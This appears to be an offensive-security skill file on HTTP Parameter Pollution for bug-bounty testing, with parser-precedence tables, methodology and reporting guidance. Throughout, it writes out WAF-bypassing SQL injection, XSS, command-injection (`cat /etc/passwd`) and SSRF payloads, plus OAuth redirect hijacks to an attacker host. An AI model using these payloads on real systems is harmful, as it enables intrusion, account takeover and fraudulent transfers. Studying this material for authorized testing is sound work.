---
name: http-parameter-pollution
category: vulnerabilities
description: HTTP Parameter Pollution for WAF bypass, server/proxy precedence differentials, OAuth redirect_uri splitting, and business-logic field override
depends_on: []
---

# HTTP Parameter Pollution (HPP)

Duplicate parameter names parsed differently by the WAF, the proxy, the framework, and the business logic. HPP alone is rarely the payout — it is a primitive that bypasses validation or rewrites a sensitive field. Aim for WAF-evading SQLi/RCE/XSS, OAuth `redirect_uri` hijack, or field override on transactions.

## Attack Surface

**Any boundary between two parsers**
- WAF/CDN (Cloudflare, Akamai, AWS WAF, Imperva) ↔ app server
- Reverse proxy (nginx, HAProxy, Envoy) ↔ application
- API gateway ↔ microservice
- Frontend form validator (JS) ↔ backend controller
- One microservice ↔ another (headers carrying joined values)

**Param locations**
- Query string (`?a=1&a=2`)
- Form body (`application/x-www-form-urlencoded`)
- Multipart form (`multipart/form-data`, duplicate `Content-Disposition: name="a"` parts)
- Cookies (`Cookie: a=1; a=2`)
- JSON duplicates (`{"a":1, "a":2}` — parsers pick one per spec ambiguity)
- Headers with comma-joined values (`X-Forwarded-For`, `Accept`)
- GraphQL variables when both query string and body define the same key

**High-value field names to pollute**
- `redirect_uri`, `return_to`, `next`, `callback`, `continue`
- `amount`, `to`, `from`, `account`, `user_id`, `order_id`
- `role`, `scope`, `permission`, `is_admin`
- `file`, `path`, `id`, `resource`
- `token`, `api_key`, `csrf`, `otp`
- `host`, `email` on password-reset flows

## Parser Precedence Cheat Sheet

| Stack | Behavior for `?a=1&a=2` | Notes |
|-------|-------------------------|-------|
| PHP / Apache | last (`2`) | `$_GET['a']` = "2". `a[]=1&a[]=2` builds array |
| ASP.NET / IIS | all, comma-joined (`"1,2"`) | `Request.QueryString["a"]` = "1,2" |
| Node.js (Express `qs`) | array `["1","2"]` or first depending on `qs.parse` config | Many apps call `.toString()` silently using the first |
| Node.js (`querystring` legacy) | array | |
| Python Django (`request.GET.get`) | last | `.getlist()` returns all |
| Python Flask (`request.args.get`) | first | `.getlist()` returns all |
| Ruby Rack / Rails | last | |
| Java Servlet (`getParameter`) | first | `getParameterValues()` returns all |
| Go `net/http` (`r.URL.Query().Get`) | first | `["a"]` for all |
| Spring MVC | first for `@RequestParam String`, list for `List<String>` | |
| Cloudflare WAF | inspects all | differential is which the app picks |
| AWS WAF | inspects all on v2 rules, first on legacy | |
| nginx `$arg_a` | first | |

Use this table to predict the differential: if WAF inspects all and app uses last, put the clean value first and the payload last.

## Key Vulnerabilities

### WAF bypass via split payload

- `?q=SELECT&q=* FROM users WHERE 1=1--` — WAF inspects concatenation, sees keywords, but its signature-based rule only matches on contiguous text. App uses last value → pure SQLi.
- `?xss=<script>&xss=alert(1)</script>` — split payload across two occurrences. App (Flask, first-wins) sees `<script>`; WAF blocking `<script>alert` on single-value match lets it through.
- `?cmd=;&cmd=cat /etc/passwd` — command injection split around the connector.

### redirect_uri / OAuth hijack

- `GET /oauth/authorize?client_id=X&redirect_uri=https://legit.com&redirect_uri=https://evil.com`
- Server-side allowlist check picks first (passes), OAuth server redirect picks last → authorization code delivered to attacker.
- Reverse: check picks last, redirect picks first. Test both orderings.

### Transaction field override

- `POST /transfer { "to":"attacker", "amount":100, "to":"attacker" }` — irrelevant; but
- `POST /transfer?to=legit&to=attacker` where validation reads first and execution reads last: classic write-to-wrong-recipient.
- Hidden-form fields on checkout: submit both and watch which wins.

### Privilege escalation via role field

- `POST /users { "username":"me", "role":"user", "role":"admin" }` — JSON parser chooses last (Python `json.loads` does). Mass-assignment guard blocks `role` only when it appears once in a denylist check that stops on first match.
- `?role=user&role=admin` on a profile update that whitelists role via first occurrence but then uses dict-flattened last.

### Cache-key pollution

- CDN uses full query string in cache key; app ignores duplicates. Different users cache different responses on identical resource URLs → leak of previous user's response.

### CSRF-token bypass

- Double-submit CSRF cookie compared to body token. If the form has `csrf=real&csrf=attacker` and server validates first but reads last into session binding, the defense breaks.

### Proxy/origin differential for auth

- API gateway validates `api_key=clean` (first), origin uses `api_key=attacker` (last). Authenticated requests reach backend under attacker identity.

## Bypass Techniques

**Array notation variants**
- `a[]=1&a[]=2`
- `a[0]=1&a[1]=2`
- `a=1&a[]=2` — type confusion in PHP; value becomes `Array`
- `a.a=1&a.b=2` — dot-notation deep-object parsing (`qs` library in Node/Express)

**Prototype pollution bridge**
- `?__proto__[admin]=true&__proto__[admin]=false` — some `qs` configs merge and pollute `Object.prototype`.
- Chain with prototype pollution class where applicable.

**Mixed sources (query + body)**
- POST with `a=clean` in query and `a=evil` in body; or vice versa. Spring MVC merges in a specific order, often body wins.
- JSON body `{"a":"evil"}` with `?a=clean` in URL — Express may favor body.

**Content-Type tricks**
- Send as `application/json` with duplicate keys — parser-dependent (Go `encoding/json` takes last, some strict parsers reject).
- Send as `application/x-www-form-urlencoded` with multipart boundary tricks to confuse the WAF.

**Cookie pollution**
- `Cookie: sid=attacker; sid=victim` — browser sends both per the cookie spec; server picks first or last. If auth check is first and session lookup is last, you log in as the wrong user.

**Header smuggling adjacent**
- `X-Forwarded-For: attacker, 127.0.0.1` — app reads first for logging, trust model uses last.
- `Host: legit\r\nHost: evil` (CRLF) — related but use CRLF-injection skill for that path.

## Testing Methodology

1. **Map the stack** — fingerprint server (`Server:`, `X-Powered-By:`, cookies like `JSESSIONID`, `ASP.NET_SessionId`, `connect.sid`, `laravel_session`). This gives you precedence prediction.
2. **Locate WAF** — 403 with a branded body (Cloudflare's challenge page, AWS WAF message), or rules that block on single-value payloads.
3. **Probe a benign duplicate** — `?debug=1&debug=2`. Check response for reflection, change in behavior, or error. Identify which value the app used.
4. **Pick high-value params** — for each sensitive operation, list every param whose override changes outcome. Duplicate each.
5. **Split known-blocked payloads** — take the WAF-blocked payload, split at obvious pivots (space, paren, quote) across duplicates.
6. **OAuth-specific** — duplicate `redirect_uri`, `state`, `client_id`, `response_type`. Capture the final 302 and read the `Location` in raw response.
7. **JSON path** — repost the same request with duplicate JSON keys. Many APIs accept silently.
8. **Cookie path** — craft `Cookie: sid=A; sid=B` by setting two with matching names in a browser or `curl -b`.
9. **Record which parser picked what** — the report must name the differential (e.g., "Cloudflare inspects all, Flask reads first").

## Validation

1. Show two raw requests: one with the single malicious value (blocked) and one HPP variant (accepted).
2. Show the backend effect: SQL error / injection success / funds movement / admin action.
3. Name the parsers on both sides of the differential ("AWS WAF rule `AWSManagedRulesSQLiRuleSet` vs `ASP.NET Request.QueryString last-wins").
4. Repeat in a clean session to rule out cache/state artifacts.
5. For OAuth, include the final redirect URL with attacker-received code/token.

## False Positives

- App and WAF use the same parser — HPP is meaningless. Duplicate behavior matches single-value behavior.
- Framework arrays the duplicates and the downstream code does `.length` checks or rejects non-string types — input lands as an array, not "evil".
- Validation applies to ALL occurrences (Spring `List<String>` + bean validation) — WAF split does not bypass.
- Triager pushback: "WAF bypass alone is not a bug" — it is not, unless you chain to the underlying vuln. Always include the follow-through (the injection that now lands).
- Triager pushback: "this needs exotic encoding" — show curl flags used; if they are default, it is realistic.
- Same-origin `redirect_uri` duplicates where OAuth server rejects anything not exactly one value — not exploitable.

## Defense-Bypass Pairs

| Defense | HPP Bypass | Corpus Evidence |
|---|---|---|
| OAuth `redirect_uri` domain allowlist (server validates first) | `?redirect_uri=legit&redirect_uri=evil` — validator checks first, redirect uses last | Twitter Digits host validation bypass (report #114169) |
| WAF signature rule blocking `UNION SELECT` | Split across duplicates: `?q=UNION&q=SELECT * FROM users` | Pattern-continuity-based WAF rules fail on split keywords |
| HMAC signature on URL parameter | Duplicate param: sign first value, renderer picks second | HackerOne redirect signature bypass ($1.5k, #293689) |
| CSRF double-submit validation | `csrf=real&csrf=attacker` — validator checks first, session binds last | — |
| Client-side JS only splits on `&` | Server splits on `&` and `;` — use `;host=trusted;@attacker.com` | Twitter Digits param parsing bypass (#126522) |
| CDN/proxy inspects all values | App uses first/last only — clean decoy + payload in the other position | Cloudflare WAF inspects all, Flask/PHP use first/last |
| JSON schema validator rejects duplicate keys | Send as `application/x-www-form-urlencoded` with duplicate fields | Go/Python JSON parsers silently accept last |
| Google API `updateMask` field-level auth | `updateMask=status` bypasses UI restriction on state field | Nest Pro self-approval via PATCH ($50k, #116404224) |

## Chain Patterns

| Chain | Steps | Corpus Bounty |
|---|---|---|
| HPP → OAuth host bypass → ATO | Duplicate `host` param, validator takes first (trusted), redirect takes last (attacker) | Twitter Digits ($undisclosed, #114169) |
| HPP → HMAC signature bypass → XSS | Sign first `url=` value, renderer picks second `url=javascript:...` | HackerOne redirect ($1.5k, #293689) |
| Semicolon delimiter differential → OAuth redirect | `;host=trusted;@attacker.com` — server splits at `;`, client treats as URL userinfo | Twitter Digits (#126522) |
| HPP → mass assignment → self-promotion | Duplicate `role` or `status` field so guard misses second occurrence | Nest Pro PATCH + updateMask ($50k) |
| HPP → SQLi WAF bypass → DB dump | Split `UNION SELECT` across duplicates past WAF signature match | — |
| HPP → SSRF WAF bypass | `url=http://safe&url=file:///etc/passwd` — WAF inspects first, fetcher uses last | — |
| HPP → cache poisoning → cross-user leak | CDN caches response keyed on first param, origin returns data for last | — |
| HPP → transaction field override | Duplicate `to` on wire-transfer: validation reads first, execution reads last | — |

## Impact

- Injection (SQLi, RCE, XSS, SSRF) via WAF bypass of payloads otherwise blocked
- OAuth authorization-code theft enabling account takeover
- Financial loss through wire/transfer recipient or amount override
- Privilege escalation through role / permission field override
- Cache poisoning and cross-user data leak
- CSRF, auth, and rate-limit bypass when guard and action read different occurrences

## Pro Tips

1. Always fingerprint before you pollute — guessing the precedence wastes PoC attempts. `Server:` header + cookie names give you 80% confidence.
2. Cloudflare and AWS WAF v2 inspect all occurrences joined; the bypass lives in pattern continuity, not in hiding the keyword. Break the keyword across duplicates.
3. On OAuth, test both orderings of `redirect_uri`. Authorization servers differ (Okta, Auth0, Keycloak, custom) — each has its own tie-break.
4. JSON duplicate keys are shockingly common on backend APIs that don't go through a strict schema validator. Try `{"role":"user","role":"admin"}` on any profile update.
5. Body-vs-query precedence in Spring/Express/Django is an overlooked class — body often wins, and WAFs usually inspect the query more aggressively.
6. Use `curl --data-urlencode 'a=first' --data-urlencode 'a=second'` and `curl -G -d a=first -d a=second` to avoid shell-quoting surprises.
7. When the first duplicate wins, attack by placing the malicious value first and a clean decoy last; when the last wins, flip it.
8. For CSRF token differentials, remember the cookie side — the server often reads the cookie header single-value while the body carries two.
9. Test semicolons as delimiters: `?host=A;host=B`. Old Apache/CGI servers split on `;` — if client JS only splits on `&`, you get a parser differential. The `;@` trick (`trusted;@attacker.com`) turns the value into a URL userinfo bypass.
10. For signed/HMAC'd parameters, HPP is a signature-bypass primitive. Sign one value, use the other. Test every endpoint that validates `signature` against a parameter.
11. Google API endpoints use `updateMask` to select which fields a PATCH updates. Always test `updateMask=status`, `updateMask=role`, `updateMask=verified` on any Google `pa` endpoint.
12. Any "check-then-use" flow where the validator and consumer might read different parameter occurrences is an HPP candidate. This includes SAML AssertionConsumerServiceURL, OIDC post_logout_redirect_uri, CORS allowlist, and JSONP callback.

## Reporting Template (minimum fields)

- Exact raw request showing the duplicate parameter (HTTP code block)
- Which duplicate the WAF/proxy/validator saw (prove with pre-HPP blocked request)
- Which duplicate the backend used (prove with response / side-effect)
- Tech stack fingerprints (`Server:`, cookie names, framework signatures)
- Downstream impact end-to-end (SQL error, funds moved, code at attacker redirect)
- Stable reproduction: 2-3 independent runs

## Severity Calibration

| Chain | Typical severity |
|-------|------------------|
| HPP → SQLi WAF bypass → DB dump | Critical |
| HPP → OAuth `redirect_uri` hijack → ATO | High / Critical |
| HPP → mass-assignment role override | High |
| HPP → transaction field override (transfer recipient, amount) | High |
| HPP → CSRF token bypass (standalone, needs another vuln to land) | Medium |
| HPP → reflected XSS WAF bypass | Medium / High |
| HPP → behavior difference with no impact | Informational (usually N/A) |

## Summary

HPP is a parser-mismatch primitive. It does not prove a bug by itself — it slips a payload past a guard or rewrites a sensitive field. Fingerprint the two parsers, pick a high-value field, split the payload, and show the downstream effect end-to-end.
